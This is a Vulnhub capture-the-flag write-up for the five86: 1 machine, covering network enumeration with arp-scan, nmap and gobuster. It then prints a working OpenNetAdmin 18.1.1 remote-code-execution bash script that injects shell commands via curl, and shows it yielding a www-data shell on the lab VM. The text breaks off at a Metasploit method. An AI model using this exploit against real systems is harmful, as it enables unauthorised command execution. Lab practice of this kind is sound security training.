# Vulnhub | five86: 1 Writeup (In Detail)
## [+] Machine Details

| INFO | Description |
| --- | --- |
| [+] Machine Name -> | ``five86: 1`` |
| [+] Release Date -> | ``8 Jan 2020`` |
| [+] Difficulty -> | ``Easy/Medium`` |
| [+] Download -> | [Download Link](https://www.vulnhub.com/entry/five86-1,417/) |
| [+] Writeup By -> | ``@pwn4magic`` - `Discord : pwn4magic#8707` |
| [+] VM Maker -> | [@DCAU7](https://twitter.com/@DCAU7) |
| [+] OS -> | ``GNU/Linux`` :penguin: |


## [+] Table of contents
* 0x00 Quick Summary
* 0x01 Enumeration
  * Finding Target's IP Address
  * nmap
  * Web Enumeration / gobuster
* 0x02 Exploitation
  * OpenNetAdmin 18.1.1 - Remote Code Execution (Method1 - bash script / shell as www-data)
  * OpenNetAdmin 18.1.1 - Remote Code Execution (Method2 - metasploit / shell as www-data) 
* 0x03 Privilege Escalation
  * 
  * 
  
# 0x00 Quick Summary

I enjoyed doing this box very much, wasn't too easy but not hard too the best combo. The entry point is a pretty straight forward, after that we have multiple privilege escalations! Let's start.

# 0x01 Enumeration
## Finding Target's IP Address
Let's find target's IP address, i always use `arp-scan`.
```
[root@pwn4magic]:~# arp-scan --localnet | grep VMware
192.168.1.12	00:0c:29:f0:cc:28	VMware, Inc.
```

## nmap

```
[root@pwn4magic]:~/Documents/vulnhub/five86_1# nmap -sC -sV -p- -oN nmap 192.168.1.12
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-20 14:01 EET
Nmap scan report for five86-1.zte.com.cn (192.168.1.12)
Host is up (0.000083s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:F0:CC:28 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration / gobuster

Let's start by enumerating port 80, the webpage has nothing totally blank.
```html
<html>
<body>
</body>
</html>
```

Let's run gobuster.

```
[root@pwn4magic]:~/Documents/vulnhub/five86_1# gobuster -q dir -u http://192.168.1.12/ -w /root/Desktop/raft-large-directories.txt -x .php,.txt
/reports (Status: 401)
/robots.txt (Status: 200)
```

`robots.txt` let's check.

```
User-agent: *
Disallow: /ona
```

Awesome, OpenNetAdmin! Let's search for possible exploits.

```
[root@pwn4magic]:~/Documents/vulnhub/five86_1# searchsploit -w OpenNetAdmin
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                               https://www.exploit-db.com/exploits/26682
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                 https://www.exploit-db.com/exploits/47691
```

# 0x02 Exploitation
## OpenNetAdmin 18.1.1 - Remote Code Execution (Method1 - bash script / shell as www-data)

Let's try to exploit first bash script way. [Exploit Link](https://www.exploit-db.com/exploits/47691)

First let's copy the main code & save it into a file.

```
[root@pwn4magic]:~/Documents/vulnhub/five86_1# touch onaexp.sh
[root@pwn4magic]:~/Documents/vulnhub/five86_1# nano onaexp.sh 
[root@pwn4magic]:~/Documents/vulnhub/five86_1# cat onaexp.sh 
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
[root@pwn4magic]:~/Documents/vulnhub/five86_1# chmod +x onaexp.sh  
[root@pwn4magic]:~/Documents/vulnhub/five86_1# ./onaexp.sh http://192.168.1.12/ona/
$ whoami; hostname
www-data
five86-1
$ 
```

## OpenNetAdmin 18.1.1 - Remote Code Execution (Method2 - metasploit / shell as www-data) 

Now let's try to exploit metasploit way! [Exploit Link](https://www.exploit-db.com/exploits/47772)
Sadly exploit doesnt exist on msf yet, so we need to import it manual. lol


